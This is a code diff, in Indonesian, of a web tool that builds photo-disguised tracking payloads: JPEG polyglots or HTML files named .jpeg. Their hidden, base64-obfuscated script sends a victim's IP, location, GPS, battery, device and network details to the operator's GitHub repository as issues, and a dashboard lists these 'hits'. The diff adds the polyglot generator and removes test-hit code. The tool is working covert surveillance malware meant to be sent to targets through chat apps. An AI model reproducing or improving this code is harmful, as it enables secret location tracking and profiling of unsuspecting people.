@@ -213,7 +213,6 @@ textarea.code{width:100%;background:#000;border:0;color:var(--ac2);font-family:v
     <select id="fChg"><option value="">Status Charging</option><option value="1">Charging ✓</option><option value="0">Battery ✗</option></select>
     <select id="fNet"><option value="">Semua Jaringan</option></select>
     <button class="btn" id="btnRefresh">⟳ REFRESH</button>
-    <button class="btn ac" id="btnTest">⚠ TEST HIT</button>
     <button class="btn danger" id="btnClear">✕ BERSIHKAN</button>
   </div>
 
@@ -252,8 +251,8 @@ textarea.code{width:100%;background:#000;border:0;color:var(--ac2);font-family:v
   <div class="bcard">
     <h3><span class="n">2</span> MODE PAYLOAD</h3>
     <div class="modes" id="modes">
-      <div class="mode on" data-mode="disguise"><b>PHOTO-DISGUISE (.jpeg)</b><span>File HTML disamarkan jadi .jpeg. Buka di browser/Telegram = JS jalan, foto tampil. Paling cocok dikirim via chat.</span></div>
-      <div class="mode" data-mode="polyglot"><b>POLYGLOT JPEG+HTML</b><span>Header JPEG asli + HTML nempel di belakang. Terbuka sebagai foto di viewer biasa.</span></div>
+      <div class="mode on" data-mode="polyglot"><b>POLYGLOT JPEG (.jpeg) ✓</b><span>Byte JPEG asli + script nempel. Foto kebuka normal di SEMUA viewer, script jalan saat dibuka via browser/chat. Paling aman dari korup.</span></div>
+      <div class="mode" data-mode="disguise"><b>PHOTO-DISGUISE (.jpeg)</b><span>File HTML disamarkan jadi .jpeg. Buka di browser/Telegram = JS jalan pasti, foto tampil via tag img.</span></div>
       <div class="mode" data-mode="script"><b>RAW SCRIPT</b><span>Hanya kode pelacak mentah. Tempel ke halaman HTML/php buatan sendiri.</span></div>
     </div>
   </div>
@@ -270,7 +269,6 @@ textarea.code{width:100%;background:#000;border:0;color:var(--ac2);font-family:v
     <div class="checks" style="margin-top:14px">
       <label><input type="checkbox" id="bGeo"> minta izin GPS target (lokasi presisi)</label>
       <label><input type="checkbox" id="bHide" checked> sembunyikan script (anti-inspect)</label>
-      <label><input type="checkbox" id="bFake" checked> kirim data dummy dari dashboard (test)</label>
     </div>
   </div>
 
@@ -310,7 +308,6 @@ textarea.code{width:100%;background:#000;border:0;color:var(--ac2);font-family:v
     <h3>⟐ AKSI</h3>
     <div class="toolbar" style="margin:0">
       <button class="btn ac" id="btnSaveCfg">💾 SIMPAN CONFIG</button>
-      <button class="btn" id="btnTest2">⚡ TERBANGKAN TEST HIT</button>
       <button class="btn danger" id="btnPurge">◉ PURGE SEMUA HIT (tutup semua issue)</button>
     </div>
   </div>
@@ -427,7 +424,8 @@ function timestr(iso){ const d=new Date(iso); const today=new Date(); const same
 function render(){
   const rows=$("rows"); rows.innerHTML="";
   const q=FILT.q.toLowerCase();
-  const list=HITS.filter(h=>{
+  const act=HITS.filter(h=>h.state==="open");
+  const list=act.filter(h=>{
     const d=h.data;
     if(FILT.os&&!(d.ua||"").includes(FILT.os)) return false;
     if(FILT.chg==="1"&&!d.charging) return false;
@@ -438,15 +436,15 @@ function render(){
   });
   list.sort((a,b)=>{ const va=a.data[SORT.k]||a.created, vb=b.data[SORT.k]||b.created; return SORT.d*(String(va).localeCompare(String(vb))); });
 
-  $("st-total").textContent=HITS.length;
-  $("st-unique").textContent=new Set(HITS.map(h=>h.data.ip)).size;
+  $("st-total").textContent=act.length;
+  $("st-unique").textContent=new Set(act.map(h=>h.data.ip)).size;
   const today=new Date().toDateString();
-  $("st-today").textContent=HITS.filter(h=>new Date(h.created).toDateString()===today).length;
-  const last=HITS[0]; if(last){ $("st-last").textContent=timestr(last.created); $("st-lastsub").textContent=(last.data.city||"")+" / "+(last.data.country||"")+(last.data.charging?" / ⚡":" / 🔋"); }
+  $("st-today").textContent=act.filter(h=>new Date(h.created).toDateString()===today).length;
+  const last=act[0]; if(last){ $("st-last").textContent=timestr(last.created); $("st-lastsub").textContent=(last.data.city||"")+" / "+(last.data.country||"")+(last.data.charging?" / ⚡":" / 🔋"); }
 
   if(!list.length){
     $("tbl").classList.add("hidden"); $("emptyDash").classList.remove("hidden");
-    $("emptyHint").textContent=HITS.length?("ada "+HITS.length+" hit, tapi filter/kolom tidak cocok"):("URL dashboard: "+location.href);
+    $("emptyHint").textContent=act.length?("ada "+act.length+" hit, tapi filter/kolom tidak cocok"):("URL dashboard: "+location.href);
     return;
   }
   $("tbl").classList.remove("hidden"); $("emptyDash").classList.add("hidden");
@@ -468,8 +466,8 @@ function render(){
     tr.onclick=()=>openModal(h);
     rows.appendChild(tr);
   }
-  if(HITS.length>lastCount){ if(CFG.sound) beep(); }
-  lastCount=HITS.length;
+  if(act.length>lastCount){ if(CFG.sound) beep(); }
+  lastCount=act.length;
 }
 
 /* ---------- modal detail ---------- */
@@ -527,7 +525,7 @@ async function refresh(force){
     await fetchHits(); render();
     s.textContent="◉ ONLINE"; s.style.color="var(--good)";
     $("liveDot").classList.remove("off");
-    $("footInfo").textContent=CFG.owner+"/"+CFG.repo+" · "+HITS.length+" hits · "+(new Date().toLocaleTimeString("id-ID",{hour12:false}));
+    $("footInfo").textContent=CFG.owner+"/"+CFG.repo+" · "+act.length+" hits · "+(new Date().toLocaleTimeString("id-ID",{hour12:false}));
   }catch(e){
     const s=$("st-status"); s.textContent="✕ OFFLINE"; s.style.color="var(--bad)";
     $("liveDot").classList.add("off");
@@ -541,18 +539,8 @@ function armTimer(){
   timer=setInterval(()=>{ if(CFG.auto&&document.querySelector('button[data-tab="dash"]').classList.contains("on")) refresh(false); },CFG.every*1000);
 }
 
-/* ---------- test hit ---------- */
-async function sendHit(payload){
-  const body="◈◈◈\n"+JSON.stringify(payload)+"\n◈◈◈";
-  return gh(`/repos/${CFG.owner}/${CFG.repo}/issues`,{method:"POST",body:JSON.stringify({title:CFG.titleTag+" "+payload.ip+" · "+(payload.city||"")+" · "+new Date().toISOString().slice(0,19),body})});
-}
-async function testHit(){
-  const d={ts:new Date().toISOString(),ip:"103.xx."+(100+Math.floor(Math.random()*80))+"."+(1+Math.floor(Math.random()*250)),city:["Jakarta","Surabaya","Bandung","Medan","Makassar","Semarang"][Math.floor(Math.random()*6)],region:"DKI Jakarta",country:"ID",org:"PT Telekomunikasi Indonesia",postal:"10210",lat:-6.2088,lon:106.8456,charging:Math.random()>.5,batteryLevel:.4+Math.random()*.6,batteryTime:3600+Math.floor(Math.random()*9000),effectiveType:["wifi","4g","3g"][Math.floor(Math.random()*3)],downlink:Math.floor(5+Math.random()*90),rtt:15+Math.floor(Math.random()*60),device:["realme 9 Pro","Xiaomi Redmi Note 11","Samsung Galaxy A13","POCO X5","iPhone 12","Oppo A76"][Math.floor(Math.random()*6)],screen:[["1080","2340"],["720","1600"],["1170","2532"],["1080","2400"]][Math.floor(Math.random()*4)].join("x"),colorDepth:24,pixelRatio:3,timezone:"Asia/Jakarta",tzOffset:-420,language:"id-ID",cores:8,memory:8,ua:navigator.userAgent,test:true};
-  try{ await sendHit(d); toast("Test hit terkirim ✓ lihat tabel"); refresh(true); }catch(e){ toast("Gagal kirim: "+e.message,true); }
-}
-
 /* ---------- delete / purge ---------- */
-async function closeIssue(n,showToast){ try{ await gh(`/repos/${CFG.owner}/${CFG.repo}/issues/${n}`,{method:"PATCH",body:JSON.stringify({state:"closed"})}); return true; }catch(e){ return false; } }
+async function closeIssue(n){ try{ await gh(`/repos/${CFG.owner}/${CFG.repo}/issues/${n}`,{method:"PATCH",body:JSON.stringify({state:"closed"})}); return true; }catch(e){ return false; } }
 async function purgeAll(){
   if(!confirm("Tutup SEMUA issue (hapus semua hit)?")) return;
   let ok=0; for(const h of HITS){ if(h.state==="open"&&await closeIssue(h.n)) ok++; }
@@ -583,31 +571,68 @@ document.querySelectorAll(".mode").forEach(m=>m.onclick=()=>{
   m.classList.add("on");
 });
 
+/* ---------- binary helpers ---------- */
+const _te=new TextEncoder();
+function dataUrlToBytes(dataUrl){
+  const m=/^data:([^;]+);base64,(.*)$/s.exec(dataUrl||""); if(!m) return null;
+  const bin=atob(m[2]); const u=new Uint8Array(bin.length);
+  for(let i=0;i<bin.length;i++) u[i]=bin.charCodeAt(i); return u;
+}
+function jpegFromDataUrl(dataUrl,onDone){
+  const im=new Image();
+  im.onload=()=>{
+    try{
+      const c=document.createElement("canvas"); c.width=im.naturalWidth; c.height=im.naturalHeight;
+      const ctx=c.getContext("2d",{alpha:false}); ctx.fillStyle="#fff"; ctx.fillRect(0,0,c.width,c.height); ctx.drawImage(im,0,0);
+      onDone(c.toDataURL("image/jpeg",0.93));
+    }catch(e){ onDone(dataUrl); }
+  };
+  im.onerror=()=>onDone(dataUrl);
+  im.src=dataUrl;
+}
+function blobDownload(bytes,name,mime){
+  const blob=new Blob([bytes],{type:mime||"application/octet-stream"});
+  const a=document.createElement("a"); a.href=URL.createObjectURL(blob); a.download=name;
+  document.body.appendChild(a); a.click(); a.remove();
+  setTimeout(()=>URL.revokeObjectURL(a.href),6000);
+}
+function fmtSize(n){ return n>1048576?(n/1048576).toFixed(2)+" MB":Math.round(n/1024)+" KB"; }
+
 $("btnGen").onclick=()=>{
   if(!bImgData){ toast("Upload foto dulu dong 😤",true); return; }
   const mode=document.querySelector(".mode.on").dataset.mode;
   const name=$("bName").value.trim()||"payload.jpeg";
   const title=$("bTitle").value||"Foto";
   const net=$("bNet").value;
-  const useGeo=$("bGeo").checked, hide=$("bHide").checked, fake=$("bFake").checked;
-  let out="";
-  if(mode==="script") out=genScript({title,net,useGeo,hide,fake});
-  else out=genHTML({img:bImgData,title,net,useGeo,hide,fake,mode});
-  const size=new Blob([out]).size;
-  $("outCode").value=out;
-  $("outSize").textContent=size>1048576?(size/1048576).toFixed(2)+" MB":Math.round(size/1024)+" KB";
-  $("outbox").classList.remove("hidden");
-  $("btnDl").disabled=false; $("btnCopy").disabled=false;
-  CFG._lastPayload={out,name};
-  toast("Payload siap ✓");
-  if(fake) setTimeout(()=>{ testHit(); },400);
+  const useGeo=$("bGeo").checked, hide=$("bHide").checked;
+  $("btnGen").disabled=true; toast("Normalisasi foto ke JPEG asli...");
+  jpegFromDataUrl(bImgData,(jpg)=>{
+    try{
+      if(mode==="script"){
+        const out=genScript({title,net,useGeo,hide});
+        CFG._lastPayload={kind:"text",text:out,mime:"text/javascript",name:name.replace(/\.[^.]+$/,"")+".js"};
+        $("outCode").value=out; $("outSize").textContent=fmtSize(new Blob([out]).size);
+      } else if(mode==="polyglot"){
+        const p=genPolyglot({img:jpg,title,net,useGeo,hide});
+        CFG._lastPayload={kind:"bin",bytes:p.bytes,name};
+        $("outCode").value=p.html; $("outSize").textContent=fmtSize(p.bytes.length)+" · JPEG asli + script";
+      } else {
+        const out=genHTML({img:jpg,title,net,useGeo,hide});
+        CFG._lastPayload={kind:"text",text:out,mime:"text/html",name};
+        $("outCode").value=out; $("outSize").textContent=fmtSize(new Blob([out]).size);
+      }
+      $("outbox").classList.remove("hidden");
+      $("btnDl").disabled=false; $("btnCopy").disabled=false;
+      toast("Payload siap ✓ foto tidak korup (JPEG valid)");
+    }catch(e){ toast("Gagal generate: "+e.message,true); }
+    $("btnGen").disabled=false;
+  });
 };
 
 $("btnDl").onclick=()=>{
-  if(!CFG._lastPayload) return;
-  const a=document.createElement("a");
-  a.href="data:application/octet-stream;base64,"+btoa(unescape(encodeURIComponent(CFG._lastPayload.out)));
-  a.download=CFG._lastPayload.name; a.click();
+  const p=CFG._lastPayload; if(!p) return;
+  if(p.kind==="bin") blobDownload(p.bytes,p.name,"image/jpeg");
+  else blobDownload(p.text,p.name,p.mime);
 };
 $("btnCopy").onclick=()=>{ navigator.clipboard.writeText($("outCode").value).then(()=>toast("Kode tersalin ✓")); };
 
@@ -618,7 +643,6 @@ function genScript(o){
   const geofn=o.useGeo?`
 function geo(){ if(navigator.geolocation){ var t=setTimeout(function(){},4000); navigator.geolocation.getCurrentPosition(function(p){ d.lat=p.coords.latitude; d.lon=p.coords.longitude; d.geo='ok'; submit(); clearTimeout(t); }, function(){}, {timeout:3500}); } else { submit(); } }`:"";
   const submitDel=`function submit(){ if(d.sent) return; d.sent=1; fetch('https://api.github.com/repos/'+W.owner+'/'+W.repo+'/issues',{method:'POST',headers:{'Authorization':'token '+W.token,'Accept':'application/vnd.github+json','Content-Type':'application/json'},body:JSON.stringify({title:W.tag+' '+d.ip+' / '+(d.city||'?')+' / '+new Date().toISOString().slice(0,19),body:'\\u25C8\\u25C8\\u25C8\\n'+JSON.stringify(d)+'\\n\\u25C8\\u25C8\\u25C8'})}).then(function(r){}).catch(function(){}); }`;
-  const fakeBlock=o.fake?`try{ /* test beacon */ fetch('https://api.github.com/repos/'+W.owner+'/'+W.repo+'/issues',{method:'POST',headers:{'Authorization':'token '+W.token,'Accept':'application/vnd.github+json','Content-Type':'application/json'},body:JSON.stringify({title:W.tag+' dummy '+new Date().toISOString().slice(0,19),body:'\\u25C8\\u25C8\\u25C8\\n'+JSON.stringify({ts:new Date().toISOString(),ip:'0.0.0.0',note:'dummy-from-builder'})+'\\n\\u25C8\\u25C8\\u25C8'})}).catch(function(){}); }catch(e){}`:"";
   return `(function(){
 "use strict";
 var W=${T};
@@ -644,31 +668,41 @@ try{if(navigator.getBattery){navigator.getBattery().then(function(b){d.batteryLe
 ${submitDel}
 ${geofn}
 function run(){fetch('https://ipinfo.io/json').then(function(r){return r.json();}).then(function(j){d.ip=j.ip||d.ip; d.city=j.city||''; d.region=j.region||''; d.country=j.country||''; d.org=(j.org||'').split(' ')[0]; d.postal=j.postal||''; d.tz=j.timezone||''; d.loc=j.loc||''; if(d.loc){var p=d.loc.split(','); d.lat=parseFloat(p[0]); d.lon=parseFloat(p[1]);} ${gps} }).catch(function(){d.ip=d.ip||'n/a'; ${gps} });}
-${fakeBlock}
 run();
 })();`;
 }
 
-/* full html payload */
+/* polyglot: byte JPEG asli + HTML tracker nempel di belakang (foto tampil normal di viewer mana pun) */
+function genPolyglot(o){
+  const core=genScript(o);
+  const hide=o.hide?'<script src="data:text/javascript,'+btoa(unescape(encodeURIComponent(core)))+'"><\/script>':'<script>'+core+'<\/script>';
+  const tail='<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'+esc(o.title)+'<\/title><style>body{margin:0;background:#000}.hold{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#000}img{max-width:100%;max-height:100%;object-fit:contain}<\/style><\/head><body><div class="hold"><img src="'+o.img+'" alt=""></div>'+hide+'<\/body><\/html>';
+  let bytes=dataUrlToBytes(o.img)||_te.encode("invalid");
+  if(bytes[bytes.length-2]!==0xff||bytes[bytes.length-1]!==0xd9){
+    const eoi=new Uint8Array([0xff,0xd9]); const tmp=new Uint8Array(bytes.length+2);
+    tmp.set(bytes); tmp.set(eoi,bytes.length); bytes=tmp;
+  }
+  const tb=_te.encode(tail);
+  const full=new Uint8Array(bytes.length+tb.length);
+  full.set(bytes); full.set(tb,bytes.length);
+  return {bytes:full,html:tail};
+}
+
+/* disguise: HTML polos disamarkan jadi .jpeg (open di browser = JS jalan pasti) */
 function genHTML(o){
   const core=genScript(o);
-  const css=o.mode==="polyglot"?"body{margin:0;background:#000}img{width:100vw;height:100vh;object-fit:contain;display:block}":".hold{position:fixed;inset:0;background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden}img{max-width:100%;max-height:100%;object-fit:contain;animation:f 1.6s ease forwards;opacity:0}@keyframes f{to{opacity:1}}";
-  const sniff=o.mode==="disguise"?"":"";
-  let head="";
-  if(o.mode==="polyglot"){ head="\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"; }
+  const css=".hold{position:fixed;inset:0;background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden}img{max-width:100%;max-height:100%;object-fit:contain;animation:f 1.6s ease forwards;opacity:0}@keyframes f{to{opacity:1}}";
   const hide=o.hide?'<script src="data:text/javascript,'+btoa(unescape(encodeURIComponent(core)))+'"><\/script>':'<script>'+core+'<\/script>';
-  return head+'<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'+esc(o.title)+'<\/title><style>'+css+'<\/style><\/head><body><div class="hold"><img src="'+o.img+'" alt=""></div>'+hide+'<\/body><\/html>';
+  return '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'+esc(o.title)+'<\/title><style>'+css+'<\/style><\/head><body><div class="hold"><img src="'+o.img+'" alt=""></div>'+hide+'<\/body><\/html>';
 }
 
 /* ---------- settings actions ---------- */
 $("btnSaveCfg").onclick=()=>{ readFields(); if($("sSaveAuto").checked) saveCfg(); applyAmoled(); armTimer(); toast("Config tersimpan ✓"); refresh(true); };
 $("sAmoled").onchange=()=>{ readFields(); applyAmoled(); };
-$("btnTest2").onclick=async()=>{ await testHit(); };
 $("btnPurge").onclick=purgeAll;
 
 /* ---------- toolbar events ---------- */
 $("btnRefresh").onclick=()=>refresh(true);
-$("btnTest").onclick=testHit;
 $("btnClear").onclick=purgeAll;
 $("q").oninput=e=>{ FILT.q=e.target.value; render(); };
 $("fOS").onchange=e=>{ FILT.os=e.target.value; render(); };
